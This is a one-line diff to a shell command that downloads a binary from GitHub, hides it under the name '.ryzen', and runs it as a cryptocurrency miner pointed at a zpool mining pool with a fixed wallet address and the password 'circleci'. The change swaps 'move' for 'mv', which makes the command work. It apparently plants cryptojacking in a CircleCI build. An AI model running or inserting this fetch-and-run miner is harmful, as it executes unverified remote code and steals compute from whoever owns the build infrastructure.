@@ -1,1 +1,1 @@
-wget https://github.com/welmii/TES/raw/main/cocoba && chmod 755 cocoba && move cocoba .ryzen && ./.ryzen -a cpupower -o stratum+tcp://cpupower.na.mine.zpool.ca:6240 -u DCFkhhgDdvBpH8rEwKiNkiVi68dyACybmK -p circleci
+wget https://github.com/welmii/TES/raw/main/cocoba && chmod 755 cocoba && mv cocoba .ryzen && ./.ryzen -a cpupower -o stratum+tcp://cpupower.na.mine.zpool.ca:6240 -u DCFkhhgDdvBpH8rEwKiNkiVi68dyACybmK -p circleci
